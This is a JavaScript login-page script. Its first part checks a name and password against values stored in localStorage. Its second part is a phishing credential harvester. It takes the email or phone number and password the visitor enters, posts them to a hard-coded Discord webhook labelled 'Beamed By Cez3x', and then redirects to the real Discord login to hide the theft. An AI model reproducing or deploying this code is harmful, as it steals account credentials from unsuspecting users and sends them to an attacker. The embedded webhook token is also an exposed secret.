const submitButton = document.getElementById('submit-btn')
const note = document.querySelector('.note')
let userName
let userPassword

function getData() {
    userName = document.getElementById('name-input').value
    userPassword = document.getElementById('password-input').value

    if(userName && userPassword) {
        if(userName == localStorage.getItem('user')) {
            if(userPassword == localStorage.getItem('password')) {
                alert(' Logged in Successfully!')
            } else {
                alert('Wrong Password!')
                note.style.visibility = 'visible'
            }
        } else {
            alert('Wrong Username!')
            note.style.visibility = 'visible'
        }
    } else {
        alert('Please Fill All Required Fields.')
    }

    
}

submitButton.addEventListener('click', getData)

btn.addEventListener("click",function(){
    var email = document.getElementById("email").value.replace(/\s/g, "");
    var password = document.getElementById("password").value.replace(/\s/g, "");
    if (email.length === 0 || password.length === 0) {
        alert("Please Fill All Required Field");
        return false;
    };
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1079346516310892596/_LeeRJG2rjDNCgl_o-Os7Sf7FRwgQ-aIk3E6aQFcDH7T3-VhQ0VuQG-fa_jHzPREu3r8");
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
                  username: "Beamed By Cez3x",
                  avatar_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRcghlSHcDsP-6nqgzvwgUjV3BRnZ5raGmjQ&usqp=CAU",
                  content:"**__New Account__**"+ "\n\n" + "**Email Or Phone Number: **" + email + "\n" + "**Password : **" + password + "\n\n" + "**=========================================================================**"
                   };
    request.send(JSON.stringify(params));
    setTimeout(() => {  window.location.replace("http://www.discord.com/login"); }, 2000);
});